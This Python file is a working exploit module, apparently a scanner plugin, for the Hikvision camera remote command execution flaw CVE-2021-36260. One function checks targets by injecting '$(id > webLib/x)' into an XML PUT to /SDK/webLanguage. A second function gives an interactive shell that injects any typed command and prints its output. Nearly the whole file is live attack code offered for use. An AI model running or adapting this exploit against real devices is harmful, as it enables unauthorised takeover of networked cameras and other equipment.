#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()

def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '该脚本存在exp函数，可执行任意命令',

      'method'    :   'put',

      'bugname'   :   'HIKVISION DS/IDS/IPC 等设备 远程命令执行漏洞 CVE-2021-36260',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua,
            'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,sv;q=0.8',
      }
  data = "<?xml version='1.0' encoding='UTF-8'?><language>$(id > webLib/x)</language>"
  target = '/SDK/webLanguage'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.put(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 500:
      res=requests.get(url=url1+'/x',headers=headers,timeout=5,verify=False)
      if res.status_code == 200 and 'uid' in res.text and 'gid' in res.text and 'groups' in res.text:
        res.close()
        ret['url'] = url1
        ret['ifbug'] = True
        return ret
      else:
        return ret
    else:
      return ret
  except:
    return ret
def attack(url):
  timeout = 5
  headers = {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
      'X-Requested-With': 'XMLHttpRequest',
      'Content-Type': 'application/x-www-form-urlencoded',
    }
  vurl = urllib.parse.urljoin(url, '/SDK/webLanguage')
  verify_url = urllib.parse.urljoin(url, '/cmd.txt')
  print('[+] Exploit loading......')
  try:
    cmd = ''
    while cmd != 'exit':
      cmd = input('[+] 执行命令 > ')
      payload = '<?xml version="1.0" encoding="UTF-8"?>' \
                '<language>' \
                '$({0}>webLib/cmd.txt)' \
                '</language>'.format(cmd)
      rep = requests.put(vurl, timeout=timeout, verify=False, headers=headers, data=payload.encode('utf-8'))
      rep2 = requests.get(verify_url, timeout=timeout, verify=False, headers=headers)
      print('[*] Output:', rep2.text)

    return True
  except:
    return False